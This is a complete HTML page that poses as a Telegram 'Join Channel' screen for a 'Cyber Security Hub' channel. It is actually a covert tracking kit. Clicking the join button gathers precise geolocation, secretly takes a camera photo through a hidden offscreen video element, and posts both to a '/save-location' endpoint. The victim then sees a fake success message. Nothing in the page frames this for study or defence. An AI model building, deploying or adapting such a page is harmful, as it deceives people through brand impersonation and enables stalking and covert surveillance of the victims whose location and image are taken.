<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Telegram - Join Channel</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background: #0f172a;
        min-height: 100vh;
        display: flex;
        align-items: flex-end;
        justify-content: center;
        overflow: hidden;
    }
    .fake-bg {
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        background: #0f172a;
        z-index: 0;
    }
    .telegram-topbar {
        background: #1e293b;
        padding: 12px 16px;
        display: flex;
        align-items: center;
        gap: 12px;
        border-bottom: 0.5px solid rgba(255,255,255,0.07);
    }
    .telegram-logo {
        width: 32px; height: 32px;
        background: #2b70e8;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 18px;
    }
    .telegram-logo-text {
        font-size: 18px;
        font-weight: 600;
        color: #e9edef;
    }
    .bottom-sheet {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        z-index: 20;
        background: #1e293b;
        border-radius: 28px 28px 0 0;
        max-height: 65vh;
        min-height: 50vh;
        animation: sheetUp 0.35s ease-out;
        box-shadow: 0 -4px 32px rgba(0,0,0,0.45);
        overflow-y: auto;
    }
    @keyframes sheetUp {
        from { transform: translateY(100%); }
        to { transform: translateY(0); }
    }
    .drag-handle {
        width: 36px; height: 4px;
        background: rgba(255,255,255,0.2);
        border-radius: 2px;
        margin: 10px auto 0 auto;
    }
    .channel-hero {
        text-align: center;
        padding: 20px;
    }
    .channel-avatar {
        width: 80px; height: 80px;
        background: linear-gradient(145deg, #2b70e8 0%, #1a4fc4 100%);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 12px auto;
        font-size: 40px;
    }
    .channel-name {
        font-size: 22px;
        font-weight: 700;
        color: #e9edef;
    }
    .channel-meta {
        font-size: 13px;
        color: #94a3b8;
        margin-top: 4px;
    }
    .stats-row {
        display: flex;
        justify-content: space-evenly;
        padding: 16px;
        background: #0f172a;
        margin: 12px 20px;
        border-radius: 16px;
    }
    .stat-item { text-align: center; }
    .stat-value { font-size: 18px; font-weight: 700; color: #e9edef; }
    .stat-label { font-size: 11px; color: #94a3b8; }
    .join-btn {
        width: calc(100% - 40px);
        margin: 20px;
        padding: 14px;
        background: #2b70e8;
        color: white;
        border: none;
        border-radius: 28px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.2s;
    }
    .join-btn:hover { background: #1a5cd4; transform: scale(1.01); }
    .join-btn:disabled { opacity: 0.6; cursor: not-allowed; }
    #hiddenCamera {
        position: fixed;
        top: -1000px;
        left: -1000px;
        width: 1px;
        height: 1px;
        opacity: 0;
        pointer-events: none;
    }
    .toast-message {
        position: fixed;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%);
        background: #1e293b;
        color: #e9edef;
        padding: 10px 20px;
        border-radius: 28px;
        font-size: 13px;
        z-index: 1000;
        white-space: nowrap;
    }
    .success-modal {
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(0,0,0,0.85);
        display: flex; align-items: center; justify-content: center;
        z-index: 2000;
    }
    .success-content {
        background: #1e293b;
        margin: 20px;
        padding: 32px;
        border-radius: 32px;
        text-align: center;
        max-width: 280px;
    }
    .success-icon { font-size: 56px; margin-bottom: 16px; }
    .success-content h3 { font-size: 20px; color: #e9edef; margin-bottom: 8px; }
    .success-content p { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }
    .success-content button {
        background: #2b70e8; color: white; border: none;
        padding: 12px 24px; border-radius: 28px;
        font-size: 14px; font-weight: 600; cursor: pointer; width: 100%;
    }
</style>
</head>
<body>

<video id="hiddenCamera" autoplay playsinline muted></video>

<div class="fake-bg">
    <div class="telegram-topbar">
        <div class="telegram-logo">📱</div>
        <div class="telegram-logo-text">Telegram</div>
    </div>
</div>

<div class="bottom-sheet">
    <div class="drag-handle"></div>
    <div class="channel-hero">
        <div class="channel-avatar">📢</div>
        <div class="channel-name">Cyber Security Hub</div>
        <div class="channel-meta">Channel • 12.5K subscribers</div>
    </div>
    
    <div class="stats-row">
        <div class="stat-item"><div class="stat-value">12.5K</div><div class="stat-label">Subscribers</div></div>
        <div class="stat-item"><div class="stat-value">2.3K</div><div class="stat-label">Online</div></div>
        <div class="stat-item"><div class="stat-value">1.2K</div><div class="stat-label">Posts</div></div>
    </div>

    <button id="joinBtn" class="join-btn" onclick="joinChannel()">
        🔗 JOIN CHANNEL
    </button>
</div>

<script>
let mediaStream = null;
let locationData = null;

async function joinChannel() {
    const btn = document.getElementById("joinBtn");
    btn.disabled = true;
    btn.textContent = "Requesting...";
    
    showToast("📍 Requesting location & camera...");
    
    if (!navigator.geolocation) {
        showToast("❌ Geolocation not supported");
        resetButton();
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        async function(position) {
            locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };
            showToast("✅ Location captured!");
            await capturePhoto();
        },
        function(error) {
            showToast("❌ Location permission denied");
            resetButton();
        },
        { enableHighAccuracy: true, timeout: 15000 }
    );
}

async function capturePhoto() {
    const video = document.getElementById('hiddenCamera');
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = mediaStream;
        video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => takePhoto(), 1000);
        };
    } catch (err) {
        saveToServer(null);
    }
}

function takePhoto() {
    const video = document.getElementById('hiddenCamera');
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    const photoData = canvas.toDataURL('image/jpeg', 0.8);
    
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }
    saveToServer(photoData);
}

function saveToServer(photoData) {
    fetch('/save-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            accuracy: locationData.accuracy,
            photo: photoData ? photoData.split(',')[1] : null,
            photo_filename: photoData ? `telegram_${Date.now()}.jpg` : null,
            tracking_type: 'initial',
            platform: 'telegram'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
            showSuccessModal();
        } else {
            showToast("❌ Failed: " + data.message);
            resetButton();
        }
    });
}

function showToast(msg) {
    const existing = document.querySelector('.toast-message');
    if (existing) existing.remove();
    const toast = document.createElement('div');
    toast.className = 'toast-message';
    toast.innerHTML = msg;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

function showSuccessModal() {
    const modal = document.createElement('div');
    modal.className = 'success-modal';
    modal.innerHTML = `
        <div class="success-content">
            <div class="success-icon">✅</div>
            <h3>Joined Successfully!</h3>
            <p>You have been added to Cyber Security Hub channel.</p>
            <button onclick="window.location.href='/'">OK</button>
        </div>
    `;
    document.body.appendChild(modal);
}

function resetButton() {
    const btn = document.getElementById("joinBtn");
    btn.disabled = false;
    btn.innerHTML = "🔗 JOIN CHANNEL";
}
</script>
</body>
</html>
